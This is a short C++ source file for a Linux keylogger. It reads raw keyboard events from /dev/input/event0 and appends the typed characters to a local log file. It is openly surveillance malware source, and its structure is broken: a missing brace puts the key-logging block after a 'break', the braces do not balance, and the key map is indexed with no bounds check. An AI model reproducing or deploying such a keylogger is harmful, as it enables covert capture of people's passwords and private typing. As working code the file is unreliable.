#include <iostream>     
#include <fstream>    
#include <fcntl.h>      
#include <unistd.h>     
#include <linux/input.h> 
#include <sys/stat.h> 
#define LOGFILE "/home/tanmeetkaur/projects/keylogger/data"  
int main(int argc, char **argv)
{
    struct input_event ev;
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1; 
    }

    std::ofstream fp(LOGFILE, std::ios::app);
    if (!fp.is_open()) {
        perror("fopen");
        close(fd);
        return 1; 
    }

    char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";

    while (1)
    {
        if (read(fd, &ev, sizeof(ev)) == -1) {
            perror("read");
            break;

      if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fp.flush();

            switch (ev.code)
            {
                case 28:
                    fp << "\n";
                    break;
                case 57:
                    fp << " ";
                    break;
                default:
                  
                    fp << map[ev.code];
            }
        }
    }

    fp.close();
    close(fd);

    return 0;
}
